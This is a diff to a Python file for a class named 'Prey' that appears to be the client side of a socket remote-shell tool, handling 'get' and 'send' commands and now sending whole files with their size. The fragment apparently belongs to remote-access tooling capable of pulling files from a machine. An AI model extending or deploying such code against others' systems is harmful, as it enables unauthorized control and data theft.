@@ -3,7 +3,7 @@ from socket import socket, AF_INET, SOCK_STREAM
 from crypt import Vigenere as v
 from time import sleep
 from sys import argv
-from os import chdir, getcwd
+from os import chdir, getcwd, path
 from optparse import OptionParser as op
 from subprocess import PIPE
 from subprocess import Popen as popen
@@ -18,9 +18,7 @@ class Prey:
 	def shell(self):
 		msj = self.recv();
 		while(msj):
-			print(msj);
 			if(msj[:3] == "get" or msj[:4] == "send"):
-				print("!");
 				b = False;
 				for t in msj.split(" "):
 					if(not b):
@@ -73,8 +71,10 @@ class Prey:
 		self.send("** {}".format(file));
 		print("Sending file");
 		try:
+			size = int(path.getsize(file));
 			with open(file,"rb") as f:
-				content = f.read(1024);
+				content = f.read(size);
+			self.send(size);
 		except Exception as e:
 			self.send("{}".format(e));
 		else:
